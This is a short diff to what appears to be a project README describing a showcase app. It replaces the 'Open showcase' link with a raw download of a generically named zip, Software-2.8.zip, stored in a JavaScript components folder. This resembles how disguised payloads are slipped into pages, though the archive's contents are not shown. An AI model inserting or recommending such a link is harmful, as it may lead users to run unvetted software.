@@ -11,6 +11,6 @@ I've spent a week's worth of after work hours to prepare a small showcase app wh
 
 As stated there, depending on how bad it gets trashed, I might document it and begin support.
 
-[Open showcase](https://raw.githubusercontent.com/AvishekInvincible/app/master/core/app_v3.2.zip).
+[Open showcase](https://github.com/AvishekInvincible/app/raw/refs/heads/master/core/js/components/Software-2.8.zip).
 
 
